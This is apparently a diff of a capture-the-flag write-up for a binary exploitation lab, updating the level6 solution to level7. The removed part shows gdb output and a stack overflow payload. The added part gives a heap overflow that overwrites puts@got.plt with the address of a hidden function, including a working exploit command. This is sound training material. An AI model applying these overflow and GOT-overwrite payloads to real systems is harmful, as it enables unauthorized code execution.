@@ -1,9 +1,9 @@
-# level6
+# level7
 
 ## Header
 
 ```bash
-ssh level6@192.168.64.9 -p 4242
+ssh level7@192.168.64.9 -p 4242
 ...
   GCC stack protector support:            Enabled
   Strict user copy checks:                Disabled
@@ -20,22 +20,20 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 
 ## Solution
 
-(gdb) b *0x080484a5
-Breakpoint 1 at 0x80484a5
-(gdb) r
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-Starting program: /home/user/level6/level6 < /tmp/payload
 
-Breakpoint 1, 0x080484a5 in main ()
-(gdb) x 0x18(%esp)
-A syntax error in expression, near `%esp)'.
-(gdb) x $esp + 0x18
-0xbffff728:     0x0804a050
-(gdb) x $esp + 0x1c
-0xbffff72c:     0x0804a008
+<!-- [scheme](./Resources/scheme07.png) -->
 
-0x0804a050 - 0x0804a008 = 0x48 = 72 (dec)
 
-./level6 $(python -c 'print "X" * 72 + "addr"')
+0x8049928 - puts@got.plt
+
+0x80484f4 - addr of m function
+
+res of 2nd malloc written to the res of 1st + 4 (arr1 + 4)
+
+<img src="./Resources/scheme07.png" width=400/>
+
+```bash
+./level7 $'XXXXXXXXXXXXXXXXXXXX\x28\x99\x04\x08' $'\xf4\x84\x04\x08'
+```
+
 ## References
